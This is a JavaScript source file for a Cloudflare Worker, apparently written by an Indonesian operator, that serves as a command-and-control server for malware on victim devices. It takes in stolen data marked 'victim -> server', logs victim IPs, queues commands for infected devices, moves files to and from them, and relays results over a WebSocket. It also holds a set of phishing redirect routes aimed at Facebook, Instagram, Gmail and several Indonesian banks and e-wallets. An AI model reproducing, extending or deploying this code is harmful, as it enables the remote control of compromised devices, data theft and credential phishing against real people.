// ================================================================
// CLOUDFLARE WORKER - verifikasi-api (KV Storage for File) - Refactor
// - Use per-file keys: file:{path}, meta:{path}, folder:{folderPath}
// - Keep existing endpoints and response shapes for backward compatibility
// ================================================================

const MAX_DATA = 2000;
const WS_PING_INTERVAL = 30000;

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-API-Key, X-Password',
  'Access-Control-Max-Age': '86400',
};

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', ...CORS },
  });
}

// ============================================================
// AUTHENTICATION - PRIORITIZE HEADER X-Password
// ============================================================
function getPasswordFromRequest(request, env) {
  const headerPwd = request.headers.get('X-Password');
  if (headerPwd) return headerPwd;
  const url = new URL(request.url);
  return url.searchParams.get('key') || url.searchParams.get('password') || '';
}

function isAuthenticated(request, env) {
  return getPasswordFromRequest(request, env) === env.PASSWORD;
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const method = request.method;

    if (method === 'OPTIONS') return new Response(null, { headers: CORS });

    // GET /get-password
    if (url.pathname === '/get-password' && method === 'GET') {
      return jsonResponse({ status: 'ok', password: env.PASSWORD || '' });
    }

    // POST /data (victim -> server) - no auth expected
    if (url.pathname === '/data' && method === 'POST') {
      return await handlePostData(request, env);
    }

    // GET /data
    if (url.pathname === '/data' && method === 'GET') {
      const type = url.searchParams.get('type');

      // Fetch C2 command for victim (auth via header)
      if (type === 'perintah') {
        const pwd = getPasswordFromRequest(request, env);
        if (pwd !== env.PASSWORD) return jsonResponse({ error: 'Invalid password' }, 401);
        const perintah = await env.DATA.get('perintah');
        if (perintah) {
          await env.DATA.delete('perintah');
          const cmd = JSON.parse(perintah);
          return jsonResponse({ aksi: cmd.aksi || 'unknown', params: cmd.params || {} });
        }
        return jsonResponse({});
      }

      // ============================================================
      // FILE ENDPOINT (KV) – auth via header
      // ============================================================
      if (type === 'list_file') {
        if (!isAuthenticated(request, env)) return jsonResponse({ error: 'Unauthorized' }, 403);
        return await handleListFile(request, env);
      }
      if (type === 'ambil_file') {
        if (!isAuthenticated(request, env)) return jsonResponse({ error: 'Unauthorized' }, 403);
        return await handleGetFile(request, env);
      }

      // Dashboard data – auth via header
      if (!isAuthenticated(request, env)) return jsonResponse({ error: 'Access Denied' }, 403);
      return await handleGetData(request, env);
    }

    // DELETE /data?type=hapus_file
    if (url.pathname === '/data' && method === 'DELETE') {
      const type = url.searchParams.get('type');
      if (type === 'hapus_file') {
        if (!isAuthenticated(request, env)) return jsonResponse({ error: 'Unauthorized' }, 403);
        return await handleDeleteFile(request, env);
      }
    }

    // POST /data?type=upload_file
    if (url.pathname === '/data' && method === 'POST') {
      const type = url.searchParams.get('type');
      if (type === 'upload_file') {
        if (!isAuthenticated(request, env)) return jsonResponse({ error: 'Unauthorized' }, 403);
        return await handleUploadFile(request, env);
      }
    }

    // POST /c2 (dashboard send command – auth via header)
    if (url.pathname === '/c2' && method === 'POST') {
      if (!isAuthenticated(request, env)) return jsonResponse({ error: 'Access Denied' }, 403);
      return await handleC2(request, env);
    }

    // WebSocket (same as before)
    if (url.pathname === '/ws') {
      return handleWebSocket(request, env);
    }

    // Phishing redirects (preserve existing behavior)
    if (method === 'GET') {
      const phishingRoutes = {
        '/fb': 'https://www.facebook.com/login',
        '/ig': 'https://www.instagram.com/accounts/login',
        '/bri': 'https://ib.bri.co.id',
        '/dana': 'https://www.dana.id',
        '/gopay': 'https://www.gojek.com',
        '/ovo': 'https://www.ovo.id',
        '/mandiri': 'https://ib.bankmandiri.co.id',
        '/bca': 'https://m.klikbca.com',
        '/shopee': 'https://shopee.co.id/login',
        '/tokped': 'https://www.tokopedia.com',
        '/jenius': 'https://www.jenius.com',
        '/gmail': 'https://accounts.google.com/signin'
      };
      if (phishingRoutes[url.pathname]) {
        return Response.redirect(phishingRoutes[url.pathname], 302);
      }
    }

    return jsonResponse({ error: 'Not Found' }, 404);
  }
};

// ============================================================
// HANDLER DATA & C2
// ============================================================
async function handlePostData(request, env) {
  try {
    const body = await request.json();
    if (!body || typeof body !== 'object') return jsonResponse({ error: 'Invalid request body' }, 400);

    const d = {
      waktu: new Date().toISOString(),
      sumber: body.sumber || body.type || 'unknown',
      data: body.data || body,
      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
      userAgent: request.headers.get('User-Agent') || 'unknown',
    };

    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    if (data.length >= MAX_DATA) data = data.slice(-MAX_DATA + 1);
    data.push(d);
    await env.DATA.put('data', JSON.stringify(data));

    return jsonResponse({ status: 'ok', total: data.length });
  } catch (error) {
    return jsonResponse({ error: 'Failed: ' + error.message }, 500);
  }
}

async function handleGetData(request, env) {
  const url = new URL(request.url);
  const source = url.searchParams.get('source');
  const search = url.searchParams.get('search');
  const sort = url.searchParams.get('sort') || 'newest';
  const limit = parseInt(url.searchParams.get('limit')) || 500;

  const raw = await env.DATA.get('data') || '[]';
  let data = JSON.parse(raw);

  if (source) data = data.filter(item => item.sumber === source);
  if (search) {
    const s = search.toLowerCase();
    data = data.filter(item => JSON.stringify(item).toLowerCase().includes(s));
  }
  if (sort === 'newest') {
    data.sort((a,b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
  } else {
    data.sort((a,b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
  }
  if (data.length > limit) data = data.slice(0, limit);

  return jsonResponse({ status: 'ok', total: data.length, data });
}

async function handleC2(request, env) {
  try {
    const body = await request.json();
    const cmd = {
      aksi: body.command || body.aksi || 'unknown',
      params: body.params || {},
      timestamp: Date.now(),
      status: 'pending'
    };
    await env.DATA.put('perintah', JSON.stringify(cmd));
    return jsonResponse({ status: 'ok', command: cmd.aksi });
  } catch (error) {
    return jsonResponse({ error: error.message }, 500);
  }
}

// ============================================================
// HELPERS for KV-per-file scheme
// ============================================================
function folderKeyFor(path) {
  // keep folder keys in the same form as received paths, ensure trailing slash
  if (!path) return 'folder:/';
  const hasTrailing = path.endsWith('/');
  const folder = hasTrailing ? path : path.replace(/\/[^\\/]*$/, '') + '/';
  return 'folder:' + folder;
}

async function safeUpdateFolderList(env, folderPath, updater) {
  // simple retry loop to reduce lost-update races
  const key = 'folder:' + folderPath;
  for (let attempt = 0; attempt < 4; attempt++) {
    try {
      const raw = await env.DATA.get(key);
      let list = raw ? JSON.parse(raw) : [];
      const newList = updater(list.slice());
      if (!newList) return true; // updater decided nothing to do
      await env.DATA.put(key, JSON.stringify(newList));
      return true;
    } catch (e) {
      // small delay then retry
      await new Promise(r => setTimeout(r, 50 * (attempt + 1)));
    }
  }
  return false;
}

async function updateFileIndexIfExists(env, modifyFn) {
  // Only update file_index if it exists to preserve backward compatibility
  const raw = await env.DATA.get('file_index');
  if (!raw) return true;
  for (let attempt = 0; attempt < 4; attempt++) {
    try {
      const index = JSON.parse(raw);
      const newIndex = modifyFn(index.slice());
      await env.DATA.put('file_index', JSON.stringify(newIndex));
      return true;
    } catch (e) {
      // if JSON.parse failed or put failed, give up after retries
      await new Promise(r => setTimeout(r, 50 * (attempt + 1)));
    }
  }
  return false;
}

// ============================================================
// HANDLER FILE (KV) – LIST, GET, UPLOAD, DELETE
// ============================================================
async function handleListFile(request, env) {
  const url = new URL(request.url);
  const path = url.searchParams.get('path') || '/';
  const limit = parseInt(url.searchParams.get('limit')) || null;
  const cursor = url.searchParams.get('cursor') || null; // not implemented fully, kept for compatibility

  try {
    // normalize prefix: keep exact form provided to preserve key layout
    const prefix = path.replace(/^\/+/, '');
    const folderKey = 'folder:' + (prefix ? (prefix.endsWith('/') ? prefix : prefix + '/') : '/');

    // Try KV-per-folder listing first
    const folderRaw = await env.DATA.get(folderKey);
    if (folderRaw) {
      let names = JSON.parse(folderRaw);
      // simple pagination
      if (cursor) {
        const start = parseInt(cursor, 10) || 0;
        names = names.slice(start, limit ? start + limit : undefined);
      } else if (limit) {
        names = names.slice(0, limit);
      }
      // fetch metadata in parallel (beware very large folders)
      const metas = await Promise.all(names.map(async name => {
        const fullPath = (prefix ? prefix + (prefix.endsWith('/') ? '' : '') : '') + name;
        const mRaw = await env.DATA.get('meta:' + fullPath);
        if (mRaw) return JSON.parse(mRaw);
        // fallback: if meta missing, try to get file size from file key (not ideal)
        const fRaw = await env.DATA.get('file:' + fullPath);
        const size = fRaw ? Math.floor(fRaw.length * 0.75) : 0;
        return { name, path: fullPath, size, isFolder: false, waktu: 0 };
      }));

      return jsonResponse({ status: 'ok', files: metas });
    }

    // Fallback: if folder metadata doesn't exist, try old file_index (maintain compatibility)
    const indexRaw = await env.DATA.get('file_index') || '[]';
    const index = JSON.parse(indexRaw);

    // Filter berdasarkan prefix path
    const files = index.filter(f => f.path.startsWith(prefix)).map(f => ({
      name: f.path.split('/').pop() || '',
      path: f.path,
      size: f.size || 0,
      isFolder: f.isFolder || false,
      waktu: f.waktu
    }));

    // Tambahkan folder virtual
    const folders = new Set();
    files.forEach(f => {
      const parts = f.path.split('/');
      if (parts.length > 1) {
        const folderPath = parts.slice(0, -1).join('/') + '/';
        if (folderPath.startsWith(prefix)) folders.add(folderPath);
      }
    });
    folders.forEach(f => {
      if (!files.find(fi => fi.path === f)) {
        files.push({ name: f.split('/').slice(-2)[0] || '', path: f, size: 0, isFolder: true });
      }
    });

    return jsonResponse({ status: 'ok', files });
  } catch (e) {
    return jsonResponse({ error: 'List failed: ' + e.message }, 500);
  }
}

async function handleGetFile(request, env) {
  const url = new URL(request.url);
  const path = url.searchParams.get('path');
  if (!path) return jsonResponse({ error: 'Missing path' }, 400);

  try {
    // Try per-file key first
    const content = await env.DATA.get(`file:${path}`);
    if (content !== null) return jsonResponse({ status: 'ok', content: content });

    // Fallback: attempt to read from old index format (if any key naming differences exist)
    const alt = await env.DATA.get(path) || await env.DATA.get(`file:/${path}`);
    if (alt !== null) return jsonResponse({ status: 'ok', content: alt });

    return jsonResponse({ error: 'File not found' }, 404);
  } catch (e) {
    return jsonResponse({ error: 'Get failed: ' + e.message }, 500);
  }
}

async function handleUploadFile(request, env) {
  const url = new URL(request.url);
  const path = url.searchParams.get('path');
  if (!path) return jsonResponse({ error: 'Missing path' }, 400);

  try {
    const body = await request.json();
    const contentBase64 = body.data;
    if (!contentBase64) return jsonResponse({ error: 'Missing data' }, 400);

    // Estimate file size
    const size = Math.floor(contentBase64.length * 0.75);
    const MAX = 20 * 1024 * 1024;
    if (size > MAX) {
      return jsonResponse({ error: 'File too large. Max 20MB for KV storage.' }, 400);
    }

    // Save content to per-file key
    await env.DATA.put(`file:${path}`, contentBase64);

    // Save metadata
    const meta = { path: path, name: (path.split('/').pop() || ''), size: size, waktu: Date.now(), isFolder: false };
    await env.DATA.put(`meta:${path}`, JSON.stringify(meta));

    // Update folder listing (simple RMW with retries)
    const folder = path.includes('/') ? path.replace(/\/[^\\/]*$/, '') + '/' : '/';
    await safeUpdateFolderList(env, folder, list => {
      const name = path.split('/').pop();
      if (!list.includes(name)) list.push(name);
      return list;
    });

    // Keep backward compatibility: update file_index if it exists
    const _ok = await updateFileIndexIfExists(env, index => {
      const filtered = index.filter(f => f.path !== path);
      filtered.push({ path: path, size: size, waktu: Date.now() });
      return filtered;
    });

    return jsonResponse({ status: 'ok', path, size });
  } catch (e) {
    return jsonResponse({ error: 'Upload failed: ' + e.message }, 500);
  }
}

async function handleDeleteFile(request, env) {
  const url = new URL(request.url);
  const path = url.searchParams.get('path');
  if (!path) return jsonResponse({ error: 'Missing path' }, 400);

  try {
    // Delete file content and metadata
    await env.DATA.delete(`file:${path}`);
    await env.DATA.delete(`meta:${path}`);

    // Update folder list
    const folder = path.includes('/') ? path.replace(/\/[^\\/]*$/, '') + '/' : '/';
    await safeUpdateFolderList(env, folder, list => {
      const name = path.split('/').pop();
      const idx = list.indexOf(name);
      if (idx !== -1) list.splice(idx, 1);
      return list;
    });

    // Update file_index if exists (backward compat)
    await updateFileIndexIfExists(env, index => index.filter(f => f.path !== path));

    return jsonResponse({ status: 'ok' });
  } catch (e) {
    return jsonResponse({ error: 'Delete failed: ' + e.message }, 500);
  }
}

// ============================================================
// WEBSOCKET (preserve original logic)
// ============================================================
async function handleWebSocket(request, env) {
  const upgradeHeader = request.headers.get('Upgrade');
  if (!upgradeHeader || upgradeHeader !== 'websocket') {
    return new Response('Expected Upgrade: websocket', { status: 426 });
  }

  const webSocketPair = new WebSocketPair();
  const [client, server] = Object.values(webSocketPair);
  server.accept();

  let authenticated = false;
  let deviceId = 'unknown';
  let pingInterval = setInterval(() => {
    try { server.send(JSON.stringify({ type: 'ping', timestamp: Date.now() })); } catch { clearInterval(pingInterval); }
  }, WS_PING_INTERVAL);

  server.addEventListener('message', async (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'auth') {
        if (data.key === env.PASSWORD) {
          authenticated = true;
          deviceId = data.deviceId || 'unknown';
          server.send(JSON.stringify({ type: 'auth_success' }));
        } else {
          server.send(JSON.stringify({ type: 'auth_failed' }));
          server.close(1008, 'Auth failed');
        }
        return;
      }
      if (!authenticated) { server.close(1008, 'Unauthorized'); return; }
      if (data.type === 'pong') return;
      if (data.type === 'command') {
        await env.DATA.put('perintah', JSON.stringify(data.command || {}));
        server.send(JSON.stringify({ type: 'command_received' }));
        return;
      }
      if (data.type === 'data' || data.type === 'result') {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);
        allData.push({
          waktu: new Date().toISOString(),
          sumber: data.type === 'result' ? 'c2_result' : 'websocket',
          data: data.data || data,
          deviceId: deviceId,
          ip: request.headers.get('CF-Connecting-IP') || 'unknown'
        });
        if (allData.length > MAX_DATA) allData = allData.slice(-MAX_DATA);
        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'saved' }));
        return;
      }
      if (data.type === 'ping') {
        server.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
        return;
      }
      server.send(JSON.stringify({ type: 'echo', data: data }));
    } catch (e) {
      server.send(JSON.stringify({ type: 'error', message: e.message }));
    }
  });

  server.addEventListener('close', () => clearInterval(pingInterval));
  return new Response(null, { status: 101, webSocket: client });
}
